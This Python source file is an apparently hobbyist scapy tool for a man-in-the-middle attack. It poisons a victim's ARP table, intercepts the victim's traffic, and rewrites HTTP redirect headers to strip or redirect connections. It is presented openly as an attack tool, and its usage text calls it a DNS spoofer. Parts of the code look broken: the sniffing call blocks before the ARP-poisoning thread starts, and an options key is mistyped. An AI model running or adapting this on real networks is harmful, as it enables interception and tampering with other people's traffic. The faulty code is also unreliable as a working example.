import sys
from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,DNSRR,UDP ,Raw,TCP 
import subprocess
import getopt
import time
import signal 
import arpUtil
import threading
import json 
import os
from HTTP import HTTP


def validateHttp(rawp:bytes):
    GOOD="HTTP"
    try : 
        return rawp[0:len(GOOD)].decode(encoding="ascii") == "HTTP"
    except : 
        return False 


def throworkill(packet,routerMac , dnsMac , interface): 
    """b'HTTP/1.1 200 OK\r\nDate: Wed, 28 Dec 2022 21:02:25 GMT\r\nServer: Apache/2.4.54 ()\r\nUpgrade: h2,h2c\r\nConnection: Upgrade, Keep-Alive\r\nLast-Modified: Wed, 29 Jun 2022 00:26:43 GMT\r\nETag: "7c-5e28b351ffe27"\r\nAccept-Ranges: bytes\r\nContent-Length: 124\r\nKeep-Alive: timeout=5, max=100\r\nContent-Type: image/vnd.microsoft.icon\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x010\x00\x00\x010\x01\x03\x00\x00\x00\n5\xbf\xb0\x00\x00\x00\x06PLTE\xff\xff\xffB\xc0\xfd.*\xd3?\x00\x00\x001IDATh\xde\xed\xca1\r\x00\x00\x08\x030\xfc\x9b\x06\x0b${v\xb4wg_4M\xd34M\xd34M\xd34M\xd3\xb4\xa8\x01\x00\x00\x00\x00\x00\x00\xf49\x04\x0f\x01\xee\x060\xdcP\x00\x00\x00\x00IEND\xaeB`\x82'
    """
    packet[Ether].src = routerMac
    packet[Ether].dst = dnsMac
    if Raw in packet and validateHttp(packet[Raw].load) : 
        httpPack = HTTP.FromRawPack(packet[Raw].load)
        if httpPack and httpPack.sslStripavailable(): 
            print(httpPack)
            httpPack.headers["Location"]="https://www.amazon.com"
            print(httpPack)
            et = Ether(src =routerMac , dst =  dnsMac )
            ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
            tcp = TCP(dport=packet[TCP].dport,sport=packet[TCP].sport,seq=packet[TCP].seq , ack =packet[TCP].ack , flags = packet[TCP].flags )
            raw = Raw(httpPack.toRaw())
            packet = et/ip/tcp/raw
    sendp(packet,iface=interface,verbose=False) 
   


def main()->None:
    '''
    usage: dnsSpoofing.py [-h] <dns ip> <interface>
    optional arguments:
        -h, --help          show this help message and exit
    put all the domains you want to spoof in the file -> corrupt.dns.json
    notes: 
        disable ip forwarding : "sudo sysctl -w net.inet.ip.forwarding=0"
        
        
    '''
             
    options = {
        "cur": None , 
        "victim": None ,  
        "victimmac":None ,  
        "targetMac" : None,
        "routerMac" : None,
        "mac ":None , #my mac
        "ip" : None , #my ip 
    } 
   
    def dispose(*args): 
        print("dispoe")
        arpUtil.changeArpTable(options["router"], options["routerMac"], options["victim"] , options["victimmac"],options["interface"] )
        sys.exit(0)
        
    def redoit():
        while(True):
            arpUtil.changeArpTable(options["router"], options["routerMac"], options["victim"] , options["mac"],options["interface"] )
            time.sleep(1)
   
    #### check ####
    if len(sys.argv) != 3 or   "-h" in sys.argv[1:] or "--help" in sys.argv[1:] : 
        print(main.__doc__)
        sys.exit(0)
    if "0" not in subprocess.check_output("sudo sysctl -w net.inet.ip.forwarding", shell=True).decode(encoding='ascii'): 
        print("disable ip forwarding")
        sys.exit(-1)
    if os.getuid() != 0 : 
        print(""" you are not privileged enough - try using 'sudo python3 ...' or 'su root' """)
        sys.exit(-1)
    #### check ####  
    
    #### options ####
    options["victim"]=sys.argv[1]
    options["interface"]=sys.argv[2]
    options["victimmac"]=arpUtil.getTargetMac(options["victim"], options["interface"])
    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    options["routerMac"] = arpUtil.getTargetMac(options["router"], options["interface"])
    options["mac"]=get_if_hwaddr(options["interface"])
    options["ip"]= get_if_addr(options["interface"])
    #### options ####
    print(options)
    sniff(lfilter= lambda x : IP in x and x[IP].dst == options["victim"] , prn = lambda packet : throworkill(packet, options["routerMac"], options["victimmac"],options["interface"]) )
     
    tr = threading.Thread(target=redoit)
    tr.start()
    
    signal.signal(signal.SIGINT, dispose)
    
    tr.join()
    signal.pause()
    dispose()


if __name__ == "__main__":
    main()